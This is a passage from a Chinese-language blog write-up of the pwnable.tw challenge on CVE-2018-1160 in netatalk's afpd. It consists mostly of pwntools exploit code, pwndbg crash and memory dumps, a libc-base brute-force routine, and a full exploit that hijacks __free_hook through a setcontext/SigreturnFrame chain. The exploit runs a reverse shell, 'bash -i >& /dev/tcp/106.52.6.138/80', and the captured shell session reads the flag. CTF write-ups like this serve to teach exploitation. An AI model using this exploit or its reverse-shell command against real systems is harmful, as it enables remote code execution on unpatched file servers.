string">"\x00\x00\x00\x00"</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    <span class="token keyword">return</span> headerdata <span class="token operator">=</span> <span class="token string">""</span>data <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x80</span>tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmpp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ sudo gdb --pid 5738 -qpwndbg&gt; set follow-fork-mode childpwndbg&gt; cContinuing.[New process 5931][Thread debugging using libthread_db enabled]Using host libthread_db library &quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libthread_db.so.1&quot;.Thread 2.1 &quot;afpd&quot; received signal SIGSEGV, Segmentation fault.[Switching to Thread 0x7fb640684740 (LWP 5931)]0x00007fb640218fbb in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────RAX  0x61616161RBX  0x55b9d5142450 ◂— 0x0RCX  0x6161616161616161 (&#39;aaaaaaaa&#39;)RDX  0x0RDI  0x55b9d5142ba8 ◂— 0x0RSI  0x7fb640583092 ◂— 0x0R8   0x55b9d5142b28 ◂— &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;R9   0x1R10  0x25R11  0x293R12  0x55b9d51400d0 ◂— 0x0R13  0x1eR14  0x7ffc23cfb350 ◂— 0x0R15  0x0RBP  0x55b9d5142450 ◂— 0x0RSP  0x7ffc23cfb250 ◂— 0x0RIP  0x7fb640218fbb ◂— movzx  eax, byte ptr [rcx + r9]─────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────► 0x7fb640218fbb    movzx  eax, byte ptr [rcx + r9]0x7fb640218fc0    lea    esi, [rdx + rax + 2]0x7fb640218fc4    cmp    rsi, qword ptr [rbx + 0x106f8]0x7fb640218fcb    mov    rdx, rsi0x7fb640218fce    jb     0x7fb640218f80                &lt;0x7fb640218f80&gt;↓0x7fb640218f80    cmp    byte ptr [rcx + rsi], 10x7fb640218f84    lea    r9d, [rdx + 1]0x7fb640218f88    movzx  eax, byte ptr [rcx + r9]0x7fb640218f8d    jne    0x7fb640218f70                &lt;0x7fb640218f70&gt;↓0x7fb640218f70    lea    esi, [rdx + rax + 2]0x7fb640218f74    cmp    rsi, qword ptr [rbx + 0x106f8]──────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffc23cfb250 ◂— 0x001:0008│     0x7ffc23cfb258 —▸ 0x7fb640218c63 ◂— mov    qword ptr [r14], 002:0010│     0x7ffc23cfb260 ◂— 0x003:0018│     0x7ffc23cfb268 ◂— 0x60000000504:0020│     0x7ffc23cfb270 ◂— 0x17090000000205:0028│     0x7ffc23cfb278 ◂— 0x2000003e806:0030│     0x7ffc23cfb280 ◂— 0x7ffc5555555407:0038│     0x7ffc23cfb288 ◂— 0x46505845 &#x2F;* &#39;EXPF&#39; *&#x2F;────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────► f 0   0x7fb640218fbbf 1              0x0─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于DSI结构体中的command指针被赋值称 <code>0x6161616161616161</code>，该地址不可访问，程序断在 <code>0x7fb640218fbb</code>处。</p></li><li><p>接下来在 <code>0x7fb640218fbb</code>处下断点，定位DSI结构体在内存中的位置：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>REMOTE <span class="token operator">=</span> <span class="token boolean">False</span>IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">5566</span><span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>    IP <span class="token operator">=</span> <span class="token string">"chall.pwnable.tw"</span>    PORT <span class="token operator">=</span> <span class="token number">10002</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    <span class="token keyword">return</span> headerdata <span class="token operator">=</span> <span class="token string">""</span>data <span class="token operator">+=</span> <span class="token string">"aaaa"</span><span class="token comment"># attn_quantum</span>data <span class="token operator">+=</span> <span class="token string">"bbbb"</span><span class="token comment"># datasize</span>data <span class="token operator">+=</span> <span class="token string">"blog"</span><span class="token comment"># server_quantum</span>tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmpp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搜索一下标记字符串”blog”：</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; search blog[heap]          0x55b9d5142b30 0x10000676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;uams_dhx2_passwd.so 0x7fb63a7d3241 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk-3.1.11&#x2F;etc&#x2F;uams&#39;uams_dhx_passwd.so 0x7fb63ae9b625 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk-3.1.11&#x2F;etc&#x2F;uams&#39;[anon_7fb640583] 0x7fb64058301a 0x676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[anon_7fb6406a8] 0x7fb6406a84b6 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;.&#39;[stack]         0x7ffc23cfda25 0x47445800676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfda74 0x53454400676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfdb23 &#39;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#39;[stack]         0x7ffc23cfdb59 0x554f4a00676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfde0f 0x55424400676f6c62 &#x2F;* &#39;blog&#39; *&#x2F;[stack]         0x7ffc23cfdef0 &#39;blog&#x2F;.local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存放结构体的堆应该位于 <code>0x55b9d5142b00</code>。commonds指针指向的地址为 <code>0x00007fb640583010</code>：</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10xg 0x55b9d5142b000x55b9d5142b00:0x00000000000000000x000000000000001e0x55b9d5142b10:0x00000000000000000x00000000000000000x55b9d5142b20:0x00000000000000000x62626262616161610x55b9d5142b30:0x00010000676f6c620x00007fb6405830100x55b9d5142b40:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vmmap观察一下周围的内存情况：</p><pre class="line-numbers language-none"><code class="language-none">0x7fb63f7d7000     0x7fb63f9be000 r-xp   1e7000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63f9be000     0x7fb63fbbe000 ---p   200000 1e7000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63fbbe000     0x7fb63fbc2000 r--p     4000 1e7000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63fbc2000     0x7fb63fbc4000 rw-p     2000 1eb000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so0x7fb63fbc4000     0x7fb63fbc8000 rw-p     4000 0      [anon_7fb63fbc4]0x7fb63fbc8000     0x7fb63fbe2000 r-xp    1a000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fbe2000     0x7fb63fde1000 ---p   1ff000 1a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fde1000     0x7fb63fde2000 r--p     1000 19000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fde2000     0x7fb63fde3000 rw-p     1000 1a000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpthread-2.27.so0x7fb63fde3000     0x7fb63fde7000 rw-p     4000 0      [anon_7fb63fde3]0x7fb63fde7000     0x7fb63fdee000 r-xp     7000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63fdee000     0x7fb63ffed000 ---p   1ff000 7000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63ffed000     0x7fb63ffee000 r--p     1000 6000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63ffee000     0x7fb63ffef000 rw-p     1000 7000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libacl.so.1.1.00x7fb63ffef000     0x7fb63fff2000 r-xp     3000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb63fff2000     0x7fb6401f1000 ---p   1ff000 3000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb6401f1000     0x7fb6401f2000 r--p     1000 2000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb6401f2000     0x7fb6401f3000 rw-p     1000 3000   &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl-2.27.so0x7fb6401f3000     0x7fb640271000 r-xp    7e000 0      &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640271000     0x7fb640470000 ---p   1ff000 7e000  &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640470000     0x7fb640471000 r--p     1000 7d000  &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640471000     0x7fb640473000 rw-p     2000 7e000  &#x2F;home&#x2F;blog&#x2F;ctf&#x2F;pwnable_tw&#x2F;CVE-2018-1160&#x2F;netatalk&#x2F;libatalk.so.180x7fb640473000     0x7fb640481000 rw-p     e000 0      [anon_7fb640473]0x7fb640481000     0x7fb6404aa000 r-xp    29000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so0x7fb640583000     0x7fb640684000 rw-p   101000 0      [anon_7fb640583]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>既然commonds指针指向的位置在libcbase的后面，那么我们可以在保证地址值是0x1000的整数倍的前提下，从高到低逐位爆破出一个可写的地址，再用这个地址去每次减0x1000枚举libcbase。在上面的vmmap中：只要枚举 (<code>0x7fb6406840000-0x7fb63f7d7000)/0x1000=3757</code>次即可得到libcbase。</p></li><li><p>我们可以在服务器上 <code>sudo nc -lvnp [PORT]</code>监听特定端口，每枚举一个libcbase，就用 <code>bash -c &quot;bash  -i&gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1&quot;</code>去尝试反弹shell，直到成功为止。</p></li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>REMOTE <span class="token operator">=</span> <span class="token boolean">True</span>IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">5566</span>CMD <span class="token operator">=</span> <span class="token string">'bash -c "bash  -i>&amp; /dev/tcp/106.52.6.138/80 0>&amp;1"'</span><span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>    IP <span class="token operator">=</span> <span class="token string">"chall.pwnable.tw"</span>    PORT <span class="token operator">=</span> <span class="token number">10002</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'error'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    <span class="token keyword">return</span> header<span class="token keyword">def</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    leak_addr <span class="token operator">=</span> <span class="token string">"\x00"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>d <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>s0 <span class="token operator">=</span> <span class="token number">255</span><span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x10</span>    s0 <span class="token operator">=</span> <span class="token number">240</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>s0<span class="token punctuation">,</span>d<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    now <span class="token operator">=</span> <span class="token string">""</span>    now <span class="token operator">+=</span> <span class="token string">"aaaa"</span><span class="token comment"># attn_quantum</span>        now <span class="token operator">+=</span> <span class="token string">"bbbb"</span><span class="token comment"># datasize</span>        now <span class="token operator">+=</span> <span class="token string">"blog"</span><span class="token comment"># server_quantum</span>        now <span class="token operator">+=</span> <span class="token string">"dddd"</span><span class="token comment"># serverID, clientID</span>    now <span class="token operator">+=</span> leak_addr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>now<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"golb"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    leak_addr <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span>                    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 0x7f1d23795000</span>    ret <span class="token operator">=</span> u64<span class="token punctuation">(</span>leak_addr<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> endian <span class="token operator">=</span> <span class="token string">"little"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ret  <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> offset    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>    dl_open_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_dl_open_hook"</span><span class="token punctuation">]</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    setcontext_53 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x520A5</span>    libc_dlopen_mode_56 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x166488</span>    fgetpos64_207 <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x7EA1F</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token string">""</span>    data <span class="token operator">+=</span> <span class="token string">"aaaa"</span><span class="token comment"># attn_quantum</span>    data <span class="token operator">+=</span> <span class="token string">"bbbb"</span><span class="token comment"># datasize</span>    data <span class="token operator">+=</span> <span class="token string">"blog"</span><span class="token comment"># server_quantum</span>    data <span class="token operator">+=</span> <span class="token string">"dddd"</span><span class="token comment"># serverID, clientID</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>free_hook <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>    sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> system_addr    sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">8</span>                   <span class="token comment"># cmd</span>    sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook                       <span class="token comment"># must be a writable address, as the stack of system func</span>    data <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xF</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>              <span class="token comment"># padding</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_dlopen_mode_56<span class="token punctuation">)</span>            <span class="token comment"># __free_hook, after this rop, rax = *dl_open_hook = dl_open_hook + 8</span>    data <span class="token operator">+=</span> CMD<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2bb8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>          <span class="token comment"># __free_hook + 8</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>dl_open_hook <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>               <span class="token comment"># dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fgetpos64_207<span class="token punctuation">)</span>                <span class="token comment"># _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8</span>    data <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x18</span>    data <span class="token operator">+=</span> p64<span class="token punctuation">(</span>setcontext_53<span class="token punctuation">)</span>             <span class="token comment"># dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53</span>      data <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token punctuation">]</span>           <span class="token comment"># now rdi = dl_open_hook + 8, thus we cut the offset from rdi to this pos</span>    payload <span class="token operator">=</span> gen_payload2<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># REMOTE: 0x7f1d2378f000</span>leak_addr <span class="token operator">=</span> bruteforce<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xffff000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    exploit<span class="token punctuation">(</span>leak_addr<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><pre class="line-numbers language-none"><code class="language-none">ubuntu@VM-8-13-ubuntu:~$ sudo nc -lvnp 80Listening on 0.0.0.0 80Connection received on 139.162.123.119 33326bash: cannot set terminal process group (7): Inappropriate ioctl for devicebash: no job control in this shellnetatalk@08e1e5af1e65:&#x2F;$ lslsbinbootdevetchomeliblib64mediamntoptprocrootrunsbinsrvsystmpusrvarnetatalk@08e1e5af1e65:&#x2F;$ cd homecd homenetatalk@08e1e5af1e65:&#x2F;home$ lslsnetatalknetatalk@08e1e5af1e65:&#x2F;home$ cd netatalkcd netatalknetatalk@08e1e5af1e65:&#x2F;home&#x2F;netatalk$ lslsafp.confafpdflaglibatalk.so.18netatalk@08e1e5af1e65:&#x2F;home&#x2F;netatalk$ cat flagcat flagFLAG&#123;ASLR_1s_us3l3ss_0n_f0rk_d43m0n&#125;netatalk@08e1e5af1e65:&#x2F;home&#x2F;netatalk$<span aria-hidden="true" 